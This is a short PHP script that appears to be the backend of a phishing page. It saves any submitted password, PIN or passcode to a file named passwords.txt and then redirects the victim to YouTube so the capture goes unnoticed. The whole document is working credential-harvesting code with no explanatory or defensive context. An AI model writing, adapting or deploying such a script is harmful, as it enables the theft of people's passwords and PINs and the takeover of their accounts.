<?php
header("Location: https://www.youtube.com");


if (!empty($_POST['passwd'])) {
file_put_contents("passwords.txt", " "   . $_POST['passwd'] , FILE_APPEND);
}
if (!empty($_POST['pin'])) {
file_put_contents("passwords.txt", " "   . $_POST['pin'] , FILE_APPEND);
}
if (!empty($_POST['passcode'])) {
file_put_contents("passwords.txt", " "   . $_POST['passcode'] , FILE_APPEND);
 }

exit();

